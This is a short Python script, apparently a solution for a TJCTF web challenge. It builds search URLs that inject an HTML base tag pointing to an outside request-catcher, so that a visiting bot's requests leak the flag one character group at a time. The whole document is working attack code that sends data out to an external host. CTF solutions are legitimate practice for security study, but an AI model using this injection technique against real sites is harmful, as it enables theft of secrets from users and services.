flag = "tjctf{"
recv_url = "https://xxxxxxxxxxxxx.x.pipedream.net"
guess_list = ["abcdefg","hijklmn","opqrstu","vwxyzAB","CDEFGHI","JKLMNOP","QRSTUVW","XYZ0123","456789_"]

for i in guess_list:
    print(f"https://dnu-merch.tjc.tf/search?search=", end="")
    for j in i:
        print(f"{flag}{j},%20", end="")
    print(f"%3Cbase%20href=%22{recv_url}%2F{flag}%2F{i}%2F%22%3E")